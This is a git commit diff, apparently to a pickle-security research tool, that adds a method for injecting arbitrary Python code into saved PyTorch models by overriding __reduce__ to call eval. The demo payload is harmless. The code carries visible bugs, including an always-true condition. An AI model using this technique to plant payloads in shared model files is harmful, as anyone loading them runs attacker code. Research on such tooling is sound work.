5684473bce0b3d74d0247f274a54a83535592979
suhacker1 <suhashussain1@gmail.com>
2023-09-21 21:39:45 -0400

    Add fallback injection

--- fickling/pytorch.py
+++ fickling/pytorch.py
@@ -2,14 +2,30 @@ import torch
 import zipfile
 import io
 from fickle import Pickled
-
+import pickle 
 from pathlib import Path
 import shutil
 from tempfile import TemporaryDirectory
 from typing import Optional
+import warnings
+
+# Create a PyTorch Model class that uses the original model as a pretrained module 
+# and injects the payload by overriding the reduce method.
+# This class is used for the fallback injection method. 
+class BaseInjection(torch.nn.Module):
+    def __init__(self, original_model: torch.nn.Module, payload: str):
+        super().__init__()
+        self.original_model = original_model
+        self.payload = payload
+    
+    def forward(self, *args, **kwargs):
+        return self.original_model(*args, **kwargs)
+    
+    def __reduce__(self):
+        print('hello')
+        return eval, (self.payload,)
 
 
-# This is where I'm actually going to test the file 
 class PyTorchModelWrapper:
     def __init__(self, path: Path):
         self.path: Path = path
@@ -28,6 +44,12 @@ class PyTorchModelWrapper:
                 with zip_ref.open(data_pkl_path, "r") as pickle_file:
                     self._pickled = Pickled.load(pickle_file)
         return self._pickled
+    
+    def inject_payload(self, payload: str, output_path: Path, injection: str = "all") -> None:
+        # Fallback injection method
+        if "fallback" or "all":
+            injected_model = BaseInjection(self.pickled.dumps(), payload)
+            torch.save(injected_model, output_path)
 
 
 # Uncomment these lines if you no longer have a 'mobilenet_v2.pt' file
@@ -37,6 +59,14 @@ class PyTorchModelWrapper:
 deserialized_model = torch.load('mobilenet_v2.pt')
 file_path = 'path/to/pytorch/model.pth'
 wrapper = PyTorchModelWrapper('mobilenet_v2.pt')
-print(wrapper.pickled)
+payload = '''print("Hello, World!")'''
+wrapper.inject_payload(payload, 'altered_model.pt')
+torch.load('altered_model.pt')
+#pickle.loads(target.dumps())
+
+# Load the modified model using torch.load with a BytesIO object
+#modified_model_data = io.BytesIO(target.dumps())
+#deserialized_modified_model = pickle.loads(modified_model_data)
+
 #wrapper.inject_code('print("Hello, World!")')
 #wrapper.save('injected_model.pt')
